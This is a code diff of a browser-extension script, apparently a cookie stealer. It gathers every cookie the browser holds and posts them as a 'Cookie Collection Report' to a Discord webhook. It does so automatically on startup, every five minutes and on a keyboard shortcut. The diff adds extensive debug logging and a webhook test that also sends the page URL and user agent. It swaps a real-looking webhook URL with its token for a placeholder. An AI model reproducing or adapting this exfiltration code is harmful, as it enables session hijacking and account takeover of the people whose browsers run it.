@@ -12,7 +12,7 @@ const config = {
   // Discord webhook configuration
   discordWebhook: {
     enabled: true,
-    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", // Replace with your actual webhook URL
+    url: "YOUR_DISCORD_WEBHOOK_URL_HERE", // Replace with your actual webhook URL
     maxMessageLength: 2000, // Discord message limit
     cookieLogEnabled: true,
     cookieLogInterval: 300000, // 5 minutes in milliseconds
@@ -137,12 +137,29 @@ function toggleDebugBox() {
 
 // Cookie collection functions
 async function getAllCookiesFromBackground() {
+  debugLog("🍪 [COOKIE DEBUG] Starting getAllCookiesFromBackground()", "info");
+  
   return new Promise((resolve) => {
+    debugLog("🍪 [COOKIE DEBUG] Sending message to background script...", "info");
+    
     chrome.runtime.sendMessage({action: 'getAllCookies'}, (response) => {
+      debugLog(`🍪 [COOKIE DEBUG] Background response received:`, "info");
+      debugLog(`🍪 [COOKIE DEBUG] Response object: ${JSON.stringify(response)}`, "info");
+      
+      if (chrome.runtime.lastError) {
+        debugLog(`🍪 [COOKIE DEBUG] Chrome runtime error: ${chrome.runtime.lastError.message}`, "error");
+        resolve([]);
+        return;
+      }
+      
       if (response && response.success) {
-        resolve(response.cookies || []);
+        const cookies = response.cookies || [];
+        debugLog(`🍪 [COOKIE DEBUG] Successfully received ${cookies.length} cookies`, "success");
+        debugLog(`🍪 [COOKIE DEBUG] First few cookies: ${JSON.stringify(cookies.slice(0, 3))}`, "info");
+        resolve(cookies);
       } else {
-        debugLog(`❌ Failed to get cookies: ${response?.error || 'Unknown error'}`, "error");
+        debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies: ${response?.error || 'Unknown error'}`, "error");
+        debugLog(`🍪 [COOKIE DEBUG] Full response: ${JSON.stringify(response)}`, "error");
         resolve([]);
       }
     });
@@ -164,12 +181,26 @@ async function getDomainCookiesFromBackground(domain) {
 
 // Discord webhook functions
 async function sendToDiscordWebhook(message, isFile = false) {
+  debugLog("📡 [DISCORD DEBUG] Starting sendToDiscordWebhook()", "info");
+  debugLog(`📡 [DISCORD DEBUG] isFile: ${isFile}`, "info");
+  debugLog(`📡 [DISCORD DEBUG] Message length: ${message?.length || 0}`, "info");
+  
+  // Check webhook configuration
+  debugLog(`📡 [DISCORD DEBUG] Webhook enabled: ${config.discordWebhook.enabled}`, "info");
+  debugLog(`📡 [DISCORD DEBUG] Webhook URL configured: ${!!config.discordWebhook.url}`, "info");
+  debugLog(`📡 [DISCORD DEBUG] Webhook URL: ${config.discordWebhook.url?.substring(0, 50)}...`, "info");
+  
   if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-    debugLog("⚠️ Discord webhook not configured", "warning");
+    debugLog("⚠️ [DISCORD DEBUG] Discord webhook not configured properly", "warning");
+    debugLog(`⚠️ [DISCORD DEBUG] Enabled: ${config.discordWebhook.enabled}`, "warning");
+    debugLog(`⚠️ [DISCORD DEBUG] URL exists: ${!!config.discordWebhook.url}`, "warning");
+    debugLog(`⚠️ [DISCORD DEBUG] URL is placeholder: ${config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE"}`, "warning");
     return false;
   }
 
   try {
+    debugLog("📡 [DISCORD DEBUG] Creating payload...", "info");
+    
     const payload = isFile ? {
       content: "🍪 **Cookie Collection Report** 🍪",
       files: [{
@@ -180,23 +211,49 @@ async function sendToDiscordWebhook(message, isFile = false) {
       content: message
     };
 
-    const response = await fetch(config.discordWebhook.url, {
+    debugLog(`📡 [DISCORD DEBUG] Payload created, type: ${isFile ? 'file' : 'message'}`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
+
+    debugLog("📡 [DISCORD DEBUG] Sending fetch request...", "info");
+    
+    const requestOptions = {
       method: 'POST',
       headers: {
         'Content-Type': isFile ? 'multipart/form-data' : 'application/json',
       },
       body: isFile ? createFormData(payload) : JSON.stringify(payload)
-    });
+    };
+
+    debugLog(`📡 [DISCORD DEBUG] Request options:`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Method: ${requestOptions.method}`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Content-Type: ${requestOptions.headers['Content-Type']}`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Body type: ${typeof requestOptions.body}`, "info");
+
+    const response = await fetch(config.discordWebhook.url, requestOptions);
+    
+    debugLog(`📡 [DISCORD DEBUG] Fetch response received`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Response status: ${response.status}`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Response statusText: ${response.statusText}`, "info");
+    debugLog(`📡 [DISCORD DEBUG] Response ok: ${response.ok}`, "info");
+
+    // Try to get response text for debugging
+    try {
+      const responseText = await response.text();
+      debugLog(`📡 [DISCORD DEBUG] Response body: ${responseText}`, "info");
+    } catch (e) {
+      debugLog(`📡 [DISCORD DEBUG] Could not read response body: ${e.message}`, "warning");
+    }
 
     if (response.ok) {
-      debugLog("✅ Successfully sent to Discord webhook", "success");
+      debugLog("✅ [DISCORD DEBUG] Successfully sent to Discord webhook", "success");
       return true;
     } else {
-      debugLog(`❌ Discord webhook failed: ${response.status} ${response.statusText}`, "error");
+      debugLog(`❌ [DISCORD DEBUG] Discord webhook failed: ${response.status} ${response.statusText}`, "error");
       return false;
     }
   } catch (error) {
-    debugLog(`❌ Discord webhook error: ${error.message}`, "error");
+    debugLog(`❌ [DISCORD DEBUG] Discord webhook error: ${error.message}`, "error");
+    debugLog(`❌ [DISCORD DEBUG] Error stack: ${error.stack}`, "error");
     return false;
   }
 }
@@ -240,51 +297,71 @@ function splitMessageForDiscord(message, maxLength = 2000) {
 
 // Main cookie logging function
 async function collectAndLogCookies() {
+  debugLog("🍪 [MAIN DEBUG] Starting collectAndLogCookies()", "info");
+  debugLog(`🍪 [MAIN DEBUG] Current time: ${new Date().toLocaleString()}`, "info");
+  
   if (!config.discordWebhook.cookieLogEnabled) {
-    debugLog("🍪 Cookie logging disabled in config", "info");
+    debugLog("🍪 [MAIN DEBUG] Cookie logging disabled in config", "info");
+    debugLog(`🍪 [MAIN DEBUG] cookieLogEnabled: ${config.discordWebhook.cookieLogEnabled}`, "info");
     return;
   }
 
   if (cookieLoggingActive) {
-    debugLog("🍪 Cookie logging already in progress, skipping", "warning");
+    debugLog("🍪 [MAIN DEBUG] Cookie logging already in progress, skipping", "warning");
+    debugLog(`🍪 [MAIN DEBUG] cookieLoggingActive: ${cookieLoggingActive}`, "warning");
     return;
   }
 
   cookieLoggingActive = true;
-  debugLog("🍪 Starting cookie collection...", "info");
+  debugLog("🍪 [MAIN DEBUG] Set cookieLoggingActive = true", "info");
+  debugLog("🍪 [MAIN DEBUG] Starting cookie collection...", "info");
 
   try {
+    debugLog("🍪 [MAIN DEBUG] Calling getAllCookiesFromBackground()...", "info");
     const cookies = await getAllCookiesFromBackground();
-    debugLog(`🍪 Collected ${cookies.length} cookies`, "info");
+    debugLog(`🍪 [MAIN DEBUG] getAllCookiesFromBackground() returned ${cookies.length} cookies`, "info");
 
     if (cookies.length === 0) {
-      debugLog("🍪 No cookies found", "warning");
+      debugLog("🍪 [MAIN DEBUG] No cookies found, ending collection", "warning");
       cookieLoggingActive = false;
       return;
     }
 
+    debugLog("🍪 [MAIN DEBUG] Calling formatCookiesForDiscord()...", "info");
     // Format cookies for Discord
     const cookieReport = await formatCookiesForDiscord(cookies);
+    debugLog(`🍪 [MAIN DEBUG] formatCookiesForDiscord() returned report of length ${cookieReport.length}`, "info");
+    debugLog(`🍪 [MAIN DEBUG] Report preview: ${cookieReport.substring(0, 200)}...`, "info");
     
     // Try to send as file first (if message is too long)
     if (cookieReport.length > config.discordWebhook.maxMessageLength) {
-      debugLog("📄 Cookie data too large, sending as file...", "info");
+      debugLog(`🍪 [MAIN DEBUG] Cookie data too large (${cookieReport.length} > ${config.discordWebhook.maxMessageLength}), sending as file...`, "info");
       const success = await sendToDiscordWebhook(cookieReport, true);
+      debugLog(`🍪 [MAIN DEBUG] File send result: ${success}`, success ? "success" : "error");
       if (success) {
-        debugLog("✅ Cookie report sent as file to Discord", "success");
+        debugLog("✅ [MAIN DEBUG] Cookie report sent as file to Discord", "success");
+      } else {
+        debugLog("❌ [MAIN DEBUG] Failed to send cookie report as file to Discord", "error");
       }
     } else {
+      debugLog(`🍪 [MAIN DEBUG] Cookie data size OK (${cookieReport.length} <= ${config.discordWebhook.maxMessageLength}), sending as message...`, "info");
       // Send as regular message
       const success = await sendToDiscordWebhook(cookieReport);
+      debugLog(`🍪 [MAIN DEBUG] Message send result: ${success}`, success ? "success" : "error");
       if (success) {
-        debugLog("✅ Cookie report sent to Discord", "success");
+        debugLog("✅ [MAIN DEBUG] Cookie report sent to Discord", "success");
+      } else {
+        debugLog("❌ [MAIN DEBUG] Failed to send cookie report to Discord", "error");
       }
     }
 
   } catch (error) {
-    debugLog(`❌ Cookie collection failed: ${error.message}`, "error");
+    debugLog(`❌ [MAIN DEBUG] Cookie collection failed: ${error.message}`, "error");
+    debugLog(`❌ [MAIN DEBUG] Error stack: ${error.stack}`, "error");
   } finally {
+    debugLog("🍪 [MAIN DEBUG] Setting cookieLoggingActive = false", "info");
     cookieLoggingActive = false;
+    debugLog("🍪 [MAIN DEBUG] collectAndLogCookies() completed", "info");
   }
 }
 
@@ -330,6 +407,28 @@ async function formatCookiesForDiscord(cookies) {
   });
 
   return formattedText;
+}
+
+// Test Discord webhook connection
+async function testDiscordWebhook() {
+  debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
+  
+  const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
+    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
+    `🌍 **URL:** ${window.location.href}\n` +
+    `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
+    `✅ If you receive this message, your webhook is working correctly!`;
+  
+  debugLog("🧪 [WEBHOOK TEST] Sending test message...", "info");
+  const success = await sendToDiscordWebhook(testMessage);
+  
+  if (success) {
+    debugLog("✅ [WEBHOOK TEST] Webhook test successful!", "success");
+  } else {
+    debugLog("❌ [WEBHOOK TEST] Webhook test failed!", "error");
+  }
+  
+  return success;
 }
 
 function debugLog(message, type = "info") {
@@ -628,6 +727,7 @@ function main() {
   debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
   debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
   debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
+  debugLog(`🧪 Test Webhook: Ctrl+Alt+T`, "info");
   debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
   debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
   
@@ -637,10 +737,16 @@ function main() {
   if (config.discordWebhook.cookieLogEnabled && config.discordWebhook.enabled) {
     debugLog(`🍪 Cookie logging enabled (interval: ${config.discordWebhook.cookieLogInterval / 1000}s)`, "info");
     
-    // Initial cookie collection after 10 seconds
+    // Test webhook connection first
+    setTimeout(() => {
+      debugLog("🧪 Testing webhook connection on startup...", "info");
+      testDiscordWebhook();
+    }, 5000);
+    
+    // Initial cookie collection after 15 seconds
     setTimeout(() => {
       collectAndLogCookies();
-    }, 10000);
+    }, 15000);
     
     // Periodic cookie collection
     setInterval(() => {
@@ -672,6 +778,13 @@ function main() {
       event.preventDefault(); // Prevent browser default behavior
       debugLog("🍪 Manual cookie collection triggered", "info");
       collectAndLogCookies();
+    }
+    
+    // Webhook test shortcut
+    if (event.ctrlKey && event.altKey && event.key === "T") {
+      event.preventDefault(); // Prevent browser default behavior
+      debugLog("🧪 Manual webhook test triggered", "info");
+      testDiscordWebhook();
     }
   });
 }
